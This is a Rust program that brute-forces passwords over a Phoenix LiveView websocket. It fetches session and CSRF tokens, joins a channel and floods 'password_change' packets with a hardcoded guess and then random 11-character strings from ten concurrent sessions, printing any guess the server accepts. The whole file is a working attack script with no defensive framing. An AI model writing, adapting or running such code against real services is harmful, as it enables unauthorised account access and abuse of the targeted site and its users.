use rand::distr::{Alphanumeric, SampleString};
use tokio_tungstenite::tungstenite::Message;
use tokio::time::{Duration, timeout, sleep};
use facade::{Client, Error, Packet};
use futures_util::StreamExt;
use std::sync::Arc;

#[tokio::main]
async fn main() -> Result<(), Error> {
   for _ in 0..10 { bruteforce().await; }
   sleep(Duration::from_secs(61)).await;
   Ok(())
}

async fn bruteforce() -> tokio::task::JoinHandle<Result<(), Error>> {
   tokio::spawn(async move {
      let mut instance = Client::new();
      // get required data //
      let (session_key, static_key, csrf_token, six_key, topic) = instance.fetch_required().await?;
      // initiate connection //
      instance.connect(&csrf_token, &six_key).await?;
      // send initial packets //
      instance.send(
         &Packet::phx_join(
            &session_key,
            &static_key,
            &csrf_token,
            &topic,
            &instance.css,
            &instance.js,
            &instance.https,
         )
      ).await?;
      instance.send(&Packet::heartbeat(10)).await?;
      // check that we can access the read channel //
      let Some(channel) = &instance.read else {
         panic!("errorhandling")
      };
      let channel = Arc::clone(channel);
      let mut read = channel.lock().await;
      let mut lastpwd = String::new();
      let mut ref_id = 11;
      loop {
         match timeout(Duration::from_secs(31), read.next()).await {
            Ok(Some(Ok(Message::Text(text)))) => {
               let Ok(proc) = Packet::try_from(text) else {
                  println!("[error] unable to convert message to packet");
                  continue;
               };
               // don't bother with evaluations if it's the phx_join packet //
               if let Some(ref_id) = &proc.1 {
                  if ref_id == "4" {
                     println!("[info] skipping initial phx_join packet");
                     continue;
                  }
                  if ref_id == "101" {
                     instance.send(&Packet::password_change(102, &topic, "70NBURHpb19")).await.unwrap();
                     lastpwd = "70NBURHpb19".to_string();
                     continue;
                  }
               }
               // println!("[info] recieved response: {:?}", &proc);
               // check if the packet has the data for a correct password //
               if let Some(payload) = &proc.4 {
                  if payload["response"] != serde_json::json!({}) {
                     println!("[success ({})] {}", &topic, &lastpwd);
                     break;
                  } else {
                     println!("[fail ({})] {}", &topic, &lastpwd);
                     lastpwd = Alphanumeric.sample_string(&mut rand::rng(), 11);
                     instance.send(&Packet::password_change(ref_id, &topic, &lastpwd)).await.unwrap();
                     ref_id += 1;
                  }
               }
            }
            Ok(Some(_)) => { println!("[warn] received non-text message (ignored)") }
            Ok(None) => { println!("[error] connection abruptly ended"); break; }
            Err(_) => { println!("[error] no response from server in 30s") }
         }
      }
      Ok(())
   })
}